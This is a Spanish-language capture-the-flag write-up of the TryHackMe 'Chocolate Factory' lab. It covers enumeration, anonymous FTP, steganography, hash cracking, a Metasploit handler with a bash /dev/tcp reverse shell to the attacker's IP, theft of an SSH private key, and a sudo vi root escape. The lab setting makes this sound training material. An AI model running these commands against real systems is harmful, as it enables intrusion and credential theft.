---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - Linux
  - HTTP
  - FTP
  - Steghide
  - JohnTheRipper
  - ReverseShell
  - PrivilegeEscalation
  - SSH
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Key|Key]]
	- [[#Explotación#FTP|FTP]]
	- [[#Explotación#Steghide|Steghide]]
	- [[#Explotación#John The Ripper|John The Ripper]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de privilegios|Escalada de privilegios]]
		- [[#Escalada de privilegios#SSH|SSH]]
		- [[#Escalada de privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina Chocolate Factory

>En esta publicación, comparto cómo resolví la máquina **Chocolate Factory** de [TryHackMe](https://tryhackme.com/room/chocolatefactory).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 10.10.220.186`

![[Pasted image 20250724193402.png]]

*TTL=63* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.220.186 -oG allPorts`

![[Pasted image 20250724193512.png]]
![[Pasted image 20250724193533.png]]

`nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sCV 10.10.220.186 -oN targeted`

![[Pasted image 20250724193622.png]]
![[Pasted image 20250724193651.png]]
![[Pasted image 20250724193716.png]]
![[Pasted image 20250724193745.png]]
![[Pasted image 20250724193813.png]]
![[Pasted image 20250724193834.png]]
![[Pasted image 20250724193857.png]]
![[Pasted image 20250724193922.png]]
![[Pasted image 20250724193944.png]]
![[Pasted image 20250724194013.png]]
### HTTP

`http://10.10.220.186/`

![[Pasted image 20250724195824.png]]

---
## Explotación
### Key

Al visualizar la parte de la enumeración se observa que en el puerto 113 se encuentra la *key*.

`http://10.10.220.186/key_rev_key`

![[Pasted image 20250724194321.png]]

Se mueve el archivo descargado a la carpeta.

`mv /home/manumore/Descargas/key_rev_key .`

Se analiza el archivo.

`file key_rev_key`

![[Pasted image 20250724194453.png]]

`strings key_rev_key`

![[Pasted image 20250724194552.png]]

Se encuentra la *key*.
### FTP

Se observa en la enumeración, en el puerto 21 el servicio **FTP**. El cual tiene activado el inicio de sesión anónimo.

`ftp anonymous@10.10.220.186`

![[Pasted image 20250724194836.png]]

`ls`

![[Pasted image 20250724194858.png]]

Se descarga la imagen.

`get gum_room.jpg`
### Steghide

Se utiliza la herramienta *steghide* de *esteganografía* que permite *ocultar y extraer archivos dentro de archivos portadores* (como imágenes o audio).

Se extraen los datos de la imagen.

`steghide extract -sf gum_room.jpg`

Se genera un archivo llamado `b64.txt`.

Se visualiza el archivo.

![[Pasted image 20250724195311.png]]

`cat b64.txt | base64 -d`

![[Pasted image 20250724195414.png]]
![[Pasted image 20250724195438.png]]
### John The Ripper

Se utiliza la herramienta *John The Ripper* para *crackear* el *hash* obtenido.

Se guarda el *hash* del usuario `charlie` en un archivo llamado `vim passwd.hash`.

`john passwd.hash --wordlist=/usr/share/wordlists/rockyou.txt`

![[Pasted image 20250724195657.png]]
### Reverse Shell

Ahora que ya tenemos el usuario (`charlie`) y contraseña (`cn7824`).

Se accede al directorio: `http://10.10.220.186/`, listado anteriormente en la enumeración.

Se introducen las credenciales, lo que da acceso a una terminal interactiva en el navegador.

![[Pasted image 20250724195937.png]]

Se inicia una escucha en el puerto 1234 para recibir la *reverse shell*.

`vim handler.rc`

```
use multi/handler
set PAYLOAD php/reverse_php
set LHOST 10.8.184.124
set LPORT 1234
run
```

`msfconsole -r handler.rc`

![[Pasted image 20250724200054.png]]

![[Pasted image 20250724200116.png]]

`bash -c "sh -i >& /dev/tcp/10.8.184.124/1234 0>&1"`

![[Pasted image 20250724200204.png]]
### Escalada de privilegios

`background`

`sessions -u 1`

`sessions 2`

`sysinfo`

![[Pasted image 20250724200252.png]]

`getuid`

![[Pasted image 20250724200306.png]]

Se accede al directorio: `/home/charlie`.

`ls -la`

![[Pasted image 20250724200506.png]]

Se descarga los archivos `teleport` y `teleport.pub`.

`download teleport.pub`

`cat teleport.pub`

![[Pasted image 20250724200714.png]]

`download download teleport`

`cat teleport`

![[Pasted image 20250724200640.png]]

Se encuentra la *id_rsa* del usuario `charlie`.
#### SSH

Se accede al servicio **SSH** con el usuario (`charlie`) y la id_rsa.

Se dan permisos a la *id_rsa*.

`chmod 600 teleport`

`ssh -i teleport charlie@10.10.220.186`

![[Pasted image 20250724200911.png]]
#### Sudo



`sudo -l`

![[Pasted image 20250724201015.png]]

En  [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo) se encuentra que `vi` puede ser usado con `sudo` para obtener una shell privilegiada.

![[Pasted image 20250724201116.png]]

`sudo vi -c ':!/bin/sh' /dev/null`

![[Pasted image 20250724201148.png]]

Se accede al directorio: `/root`.

`ls`

![[Pasted image 20250724201231.png]]

`cat root.py`

![[Pasted image 20250724201258.png]]

`python root.py`

Finalmente, el script `root.py` solicita la clave identificada previamente (`key_rev_key`), y al introducirla, muestra la flag final de la máquina.

---